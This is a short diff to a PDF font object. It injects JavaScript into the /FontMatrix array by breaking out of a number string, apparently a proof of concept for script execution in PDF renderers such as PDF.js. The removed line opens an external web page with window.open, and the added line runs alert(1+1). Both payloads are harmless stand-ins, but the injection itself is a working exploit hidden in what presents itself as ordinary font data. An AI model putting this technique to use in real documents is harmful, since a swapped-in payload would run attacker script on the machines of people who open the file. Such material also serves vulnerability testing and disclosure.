@@ -27,7 +27,7 @@ endobj
 /LastChar 102
 /Encoding/WinAnsiEncoding
 /FontMatrix [0.1 0 0 0.1 0 (1\); 
-window.open\('https://www.online-calculator.com/full-screen-calculator/')]
+alert\(1+1)]
 /Subtype/Type1
 /FirstChar 65
 /FontDescriptor 9 0 R
